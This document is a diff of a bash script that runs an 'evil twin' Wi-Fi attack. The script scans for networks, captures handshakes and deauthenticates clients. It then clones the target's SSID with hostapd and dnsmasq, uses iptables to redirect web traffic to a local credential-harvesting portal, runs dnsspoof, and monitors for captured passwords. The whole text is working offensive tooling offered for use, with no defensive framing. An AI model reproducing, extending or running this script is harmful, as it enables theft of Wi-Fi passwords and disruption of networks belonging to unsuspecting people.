@@ -1,13 +1,16 @@
 #!/bin/bash
+
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m'
+
 log_info() { echo -e "${GREEN}[*]${NC} $1"; }
 log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
 log_error() { echo -e "${RED}[-]${NC} $1"; }
 log_success() { echo -e "${GREEN}[✓]${NC} $1"; }
+
 TARGET_BSSID=""
 TARGET_SSID=""
 TARGET_CHANNEL=""
@@ -15,24 +18,42 @@ FAKE_SSID=""
 HANDSHAKE_FILE=""
 DEAUTH_PID=""
 MON_INTERFACE=""
+AP_INTERFACE="wlan2"
+INTERNET_INTERFACE=""
+SELECTED_INTERFACE=""
+
 get_monitor_interface() {
-    local mon_iface=$(iw dev | awk '/Interface/ {iface=$2} /type monitor/ {print iface}' | head -1)
+    local selected_iface="$SELECTED_INTERFACE"
+    
+    local mon_iface=$(iw dev 2>/dev/null | awk '/Interface/ {iface=$2} /type monitor/ {print iface}' | head -1)
     if [ -n "$mon_iface" ]; then
         echo "$mon_iface"
         return
     fi
-    for iface in wlan1mon wlan1_mon mon0 mon1; do
-        if iw dev | grep -q "Interface $iface"; then
+    
+    for suffix in "mon" "_mon" ""; do
+        check_iface="${selected_iface}${suffix}"
+        if iw dev 2>/dev/null | grep -q "Interface $check_iface"; then
+            echo "$check_iface"
+            return
+        fi
+    done
+    
+    for iface in mon0 mon1; do
+        if iw dev 2>/dev/null | grep -q "Interface $iface"; then
             echo "$iface"
             return
         fi
     done
-    if iw dev wlan1 info 2>/dev/null | grep -q "type monitor"; then
-        echo "wlan1"
+    
+    if iw dev "$selected_iface" info 2>/dev/null | grep -q "type monitor"; then
+        echo "$selected_iface"
         return
     fi
+    
     echo ""
 }
+
 cleanup() {
     echo ""
     log_info "Shutting down attack..."
@@ -45,18 +66,17 @@ cleanup() {
     fuser -k 5000/tcp 2>/dev/null
     fuser -k 80/tcp 2>/dev/null
     [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
-    iw dev wlan2 del > /dev/null 2>&1
+    [ -n "$AP_INTERFACE" ] && iw dev "$AP_INTERFACE" del > /dev/null 2>&1
     if [ -n "$MON_INTERFACE" ]; then
-        airmon-ng stop $MON_INTERFACE > /dev/null 2>&1
-    else
-        airmon-ng stop wlan1 > /dev/null 2>&1
+        airmon-ng stop "$MON_INTERFACE" > /dev/null 2>&1
     fi
     iptables --flush 2>/dev/null
     ip rule del from all lookup main pref 1 2>/dev/null || true
-    ip rule del from all iif lo oif wlan2 uidrange 0-0 lookup 97 pref 11000 2>/dev/null || true
-    ip rule del from all iif lo oif wlan0 lookup main pref 17000 2>/dev/null || true 
-    ip rule del from all iif lo oif rmnet_data2 lookup main pref 17000 2>/dev/null || true
-    ip rule del from all iif lo oif wlan2 lookup 97 pref 17000 2>/dev/null || true
+    ip rule del from all iif lo oif "$AP_INTERFACE" uidrange 0-0 lookup 97 pref 11000 2>/dev/null || true
+    if [ -n "$INTERNET_INTERFACE" ]; then
+        ip rule del from all iif lo oif "$INTERNET_INTERFACE" lookup main pref 17000 2>/dev/null || true
+    fi
+    ip rule del from all iif lo oif "$AP_INTERFACE" lookup 97 pref 17000 2>/dev/null || true
     ip rule del pref 21000 2>/dev/null || true
     log_info "Cleaning up temporary files..."
     rm -f evil-*.cap evil-*.csv evil-*.kismet.* evil-*.netxml
@@ -76,7 +96,9 @@ cleanup() {
     log_success "Cleanup complete"
     exit 0
 }
+
 trap cleanup SIGINT SIGTERM EXIT
+
 get_usb_device_info() {
     local iface="$1"
     wireless_devices=$(lsusb | grep -i "wireless\\|network\\|wlan\\|rtl\\|atheros\\|ralink" | grep -v "root hub")
@@ -88,6 +110,7 @@ get_usb_device_info() {
         echo "${device_name:-External USB Adapter}"
     fi
 }
+
 get_pci_device_info() {
     local iface="$1"
     if command -v lspci >/dev/null 2>&1; then
@@ -102,6 +125,7 @@ get_pci_device_info() {
     fi
     echo "Unknown PCI device"
 }
+
 select_adapter() {
     log_info "Scanning for wireless adapters..."
     interfaces=($(iw dev 2>/dev/null | grep "Interface" | awk '{print $2}'))
@@ -174,9 +198,14 @@ select_adapter() {
         fi
     done
 }   
+
 scan_networks() {
     log_info "Scanning for networks..."
-    sudo airmon-ng start wlan1 > /dev/null 2>&1
+    if [ -z "$SELECTED_INTERFACE" ]; then
+        log_error "No interface selected!"
+        exit 1
+    fi
+    sudo airmon-ng start "$SELECTED_INTERFACE" > /dev/null 2>&1
     sleep 5
     MON_INTERFACE=$(get_monitor_interface)
     if [ -z "$MON_INTERFACE" ]; then
@@ -229,6 +258,7 @@ scan_networks() {
     FAKE_SSID="$TARGET_SSID"
     log_success "Target: $TARGET_SSID (${TARGET_BSSID:0:8}...) on channel $TARGET_CHANNEL"
 }
+
 capture_handshake() {
     local bssid="$1"
     local channel="$2"
@@ -266,6 +296,7 @@ capture_handshake() {
         fi
     fi
 }
+
 update_configs() {
     local bssid="$1"
     local channel="$2"
@@ -283,41 +314,121 @@ update_configs() {
     if [ -f "hostapd.conf" ]; then
         sed -i "s/^ssid=.*/ssid=$ssid/" hostapd.conf
         sed -i "s/^channel=.*/channel=$channel/" hostapd.conf
+        sed -i "s/^interface=.*/interface=$AP_INTERFACE/" hostapd.conf
     else
         log_error "hostapd.conf not found!"
         exit 1
     fi
+    if [ -f "dnsmasq.conf" ]; then
+        sed -i "s/^interface=.*/interface=$AP_INTERFACE/" dnsmasq.conf
+    else
+        log_error "dnsmasq.conf not found!"
+        exit 1
+    fi
 }
-select_internet_source() {
+
+select_interfaces() {
+    echo "----------------------------------------"
+    echo "AP Interface Selection:"
+    echo " 1. wlan1"
+    echo " 2. wlan2 (default)"
+    echo " 3. wlan3"
+    echo " 4. Custom name"
+    echo "----------------------------------------"
+    
+    read -p "Select AP interface [1-4]: " ap_choice
+    
+    case $ap_choice in
+        1) AP_INTERFACE="wlan1" ;;
+        2) AP_INTERFACE="wlan2" ;;
+        3) AP_INTERFACE="wlan3" ;;
+        4) 
+            read -p "Enter custom AP interface: " custom_ap
+            AP_INTERFACE="${custom_ap:-wlan2}"
+            ;;
+        *) AP_INTERFACE="wlan2" ;;
+    esac
+    
     echo "----------------------------------------"
     echo "Internet Source:"
-    echo " 1. WiFi Sharing (fakeap.sh)"
-    echo " 2. Cellular Data (4g-ap.sh)"
+    echo " 1. WiFi (wlan0)"
+    echo " 2. Cellular (rmnet_data2)"
+    echo " 3. Custom interface"
     echo "----------------------------------------"
-    while true; do
-        read -p "Select (1/2): " choice
-        case $choice in
-            1)
-                INTERNET_CHOICE="wifi"
-                break
-                ;;
-            2)
-                INTERNET_CHOICE="cellular"
-                break
-                ;;
-            *)
-                log_error "Invalid choice"
-                ;;
-        esac
-    done
+    
+    read -p "Select internet source [1-3]: " internet_choice
+    
+    case $internet_choice in
+        1) INTERNET_INTERFACE="wlan0" ;;
+        2) INTERNET_INTERFACE="rmnet_data2" ;;
+        3) 
+            read -p "Enter custom internet interface: " custom_internet
+            INTERNET_INTERFACE="${custom_internet:-wlan0}"
+            ;;
+        *) INTERNET_INTERFACE="wlan0" ;;
+    esac
+    
+    log_success "AP Interface: $AP_INTERFACE"
+    log_success "Internet Interface: $INTERNET_INTERFACE"
 }
+
+setup_internet_sharing() {
+    log_info "Setting up internet sharing..."
+    
+    echo "Checking default rule number.."
+    local table=""
+    for table in $(ip rule list | awk -F"lookup" '{print $2}'); do
+        DEF=$(ip route show table "$table" 2>/dev/null | grep default | grep "$INTERNET_INTERFACE")
+        if ! [ -z "$DEF" ]; then
+            break
+        fi
+    done
+    echo "Default rule number is $table"
+    
+    echo "Checking for existing $AP_INTERFACE interface..."
+    if ip link show "$AP_INTERFACE" 2>/dev/null; then
+        echo "$AP_INTERFACE exists, continuing.."
+    else
+        if [[ $(iw list 2>/dev/null | grep '* AP') == *"* AP"* ]]; then
+            echo "wlan0 supports AP mode, creating AP interface.."
+            iw dev wlan0 interface add "$AP_INTERFACE" type __ap
+            ip addr flush "$AP_INTERFACE"
+            ip addr flush "$AP_INTERFACE"
+            ip link set up dev "$AP_INTERFACE"
+        else
+            echo "wlan0 doesn't support AP mode, exiting.."
+            exit 1
+        fi
+    fi
+    
+    echo "Adding iptables for internet sharing..."
+    iptables --flush
+    
+    ifconfig "$AP_INTERFACE" up 10.0.0.1 netmask 255.255.255.0
+    route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+    
+    iptables -t nat -A PREROUTING -i "$AP_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
+    iptables --table nat --append POSTROUTING --out-interface "$INTERNET_INTERFACE" -j MASQUERADE
+    iptables --append FORWARD --in-interface "$AP_INTERFACE" -j ACCEPT
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    
+    ip rule add from all lookup main pref 1 2> /dev/null
+    ip rule add from all iif lo oif "$AP_INTERFACE" uidrange 0-0 lookup 97 pref 11000 2>/dev/null
+    ip rule add from all iif lo oif "$INTERNET_INTERFACE" lookup "$table" pref 17000 2>/dev/null
+    ip rule add from all iif lo oif "$AP_INTERFACE" lookup 97 pref 17000 2>/dev/null
+    ip rule add from all iif "$AP_INTERFACE" lookup "$table" pref 21000 2>/dev/null
+    
+    echo "Starting services..."
+    sleep 5 && hostapd hostapd.conf > /dev/null 2>&1 &
+    sleep 5
+    dnsmasq -C dnsmasq.conf > /dev/null 2>&1 &
+    sleep 5
+    dnsspoof -i "$AP_INTERFACE" > /dev/null 2>&1 &
+}
+
 start_evil_twin() {
     log_info "Starting evil twin..."
-    if [ "$INTERNET_CHOICE" = "wifi" ]; then
-        ./fakeap.sh > /dev/null 2>&1 &
-    else
-        ./4g-ap.sh > /dev/null 2>&1 &
-    fi
+    setup_internet_sharing
     sleep 8
     python3 passapi.py > /dev/null 2>&1 &
     sleep 3
@@ -327,6 +438,7 @@ start_evil_twin() {
     sleep 8
     log_success "Evil twin is live"
 }
+
 monitor_attack() {
     local bssid="$1"
     log_info "Continuous deauth maintained from capture phase"
@@ -336,9 +448,10 @@ monitor_attack() {
     echo "Target:    $TARGET_SSID"
     echo "Evil Twin: $FAKE_SSID" 
     echo "Channel:   $TARGET_CHANNEL"
-    echo "Internet:   $INTERNET_CHOICE"
+    echo "AP Interface: $AP_INTERFACE"
+    echo "Internet:  $INTERNET_INTERFACE"
     echo "Handshake: $HANDSHAKE_FILE"
-    echo "Deauth:    CONTINUOUS" 
+    echo "Deauth:   $MON_INTERFACE"
     echo "----------------------------------------"
     echo "Monitoring for credentials..."
     echo "----------------------------------------"
@@ -386,6 +499,7 @@ monitor_attack() {
         sleep 5
     done
 }
+
 main() {
     echo "========================================"
     echo "      EVIL TWIN ATTACK"
@@ -447,8 +561,9 @@ main() {
     scan_networks
     capture_handshake "$TARGET_BSSID" "$TARGET_CHANNEL" "$TARGET_SSID"
     update_configs "$TARGET_BSSID" "$TARGET_CHANNEL" "$FAKE_SSID"
-    select_internet_source
+    select_interfaces
     start_evil_twin
     monitor_attack "$TARGET_BSSID"
 }
+
 main
